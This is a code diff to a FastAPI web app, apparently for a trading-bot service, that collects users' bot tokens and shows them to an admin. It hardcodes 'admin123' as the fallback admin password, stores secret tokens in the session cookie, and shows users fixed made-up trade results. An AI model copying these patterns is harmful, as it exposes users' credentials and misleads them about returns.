@@ -8,6 +8,7 @@ from dotenv import load_dotenv
 # Load environment variables
 load_dotenv()
 
+# App setup
 app = FastAPI()
 
 # Middleware for session handling
@@ -22,9 +23,12 @@ DISCORD_LINK = os.getenv("DISCORD_LINK")
 ADMIN_LOGIN = os.getenv("ADMIN_LOGIN", "admin")           # Default fallback
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")  # Default fallback
 
+# Simulated in-memory storage for user submissions
+user_submissions = []
+
 # === Home Page ===
 @app.get("/", response_class=HTMLResponse)
-async def read_root():
+async def read_root(request: Request):
     try:
         with open("index.html", "r") as file:
             content = file.read()
@@ -55,9 +59,25 @@ async def submit(
     print(f"Login ID: {login_id}")
     print(f"Strategy: {strategy}")
 
-    # Set session variables
-    request.session["user_logged_in"] = True
-    request.session["login_id"] = login_id
+    # Save user submission to session
+    request.session["user"] = {
+        "bot_token": bot_token,
+        "login_id": login_id,
+        "strategy": strategy
+    }
+
+    # Save to in-memory log for admin view
+    user_submissions.append({
+        "bot_token": bot_token,
+        "login_id": login_id,
+        "strategy": strategy,
+        "trade_logs": [
+            "Trade 1: BTC +2.3%",
+            "Trade 2: ETH -1.1%",
+            "Trade 3: SOL +4.2%"
+        ]
+    })
+
     if remember_me == "on":
         pass  # Optional: Add persistent session logic here
 
@@ -70,13 +90,13 @@ async def submit(
 
 # === Admin Panel Section ===
 @app.get("/admin", response_class=HTMLResponse)
-async def admin_login():
+async def admin_login(request: Request):
     try:
-        with open("admin.html", "r") as file:
+        with open("admin_login.html", "r") as file:
             content = file.read()
         return HTMLResponse(content=content)
     except FileNotFoundError:
-        return HTMLResponse("<h1>Error: admin.html not found</h1>", status_code=404)
+        return HTMLResponse("<h1>Error: admin_login.html not found</h1>", status_code=404)
 
 @app.post("/admin", response_class=HTMLResponse)
 async def admin_auth(
@@ -91,34 +111,49 @@ async def admin_auth(
         if remember_me == "on":
             pass  # Optional: Add persistent session logic here
 
-        try:
-            with open("dashboard.html", "r") as file:
-                content = file.read()
-            return HTMLResponse(content=content)
-        except FileNotFoundError:
-            return HTMLResponse("<h1>Error: dashboard.html not found</h1>", status_code=404)
+        return RedirectResponse("/admin/dashboard", status_code=303)
 
     print("Login failed")
     try:
-        with open("admin.html", "r") as file:
+        with open("admin_login.html", "r") as file:
             content = file.read()
         return HTMLResponse(content=content.replace("{{ error }}", "Invalid login credentials. Please try again."))
+    except FileNotFoundError:
+        return HTMLResponse("<h1>Error: admin_login.html not found</h1>", status_code=404)
+
+# === Admin Dashboard ===
+@app.get("/admin/dashboard", response_class=HTMLResponse)
+async def admin_dashboard(request: Request):
+    if not request.session.get("admin_logged_in"):
+        return RedirectResponse("/admin", status_code=303)
+
+    try:
+        with open("admin.html", "r") as file:
+            content = file.read()
+        return HTMLResponse(content=content)
     except FileNotFoundError:
         return HTMLResponse("<h1>Error: admin.html not found</h1>", status_code=404)
 
 # === User Dashboard ===
 @app.get("/dashboard", response_class=HTMLResponse)
 async def dashboard(request: Request):
-    user = request.session.get("user")
-    if not user:
+    user_data = request.session.get("user")
+    if not user_data:
         return RedirectResponse("/", status_code=303)
 
+    # Find logs for this user
+    logs = []
+    for entry in user_submissions:
+        if entry["login_id"] == user_data["login_id"]:
+            logs = entry["trade_logs"]
+            break
+
     try:
-        with open("dashboard.html", "r") as file:
+        with open("user_dashboard.html", "r") as file:
             content = file.read()
         return HTMLResponse(content=content)
     except FileNotFoundError:
-        return HTMLResponse("<h1>Error: dashboard.html not found</h1>", status_code=404)
+        return HTMLResponse("<h1>Error: user_dashboard.html not found</h1>", status_code=404)
 
 # === Logout ===
 @app.get("/logout")
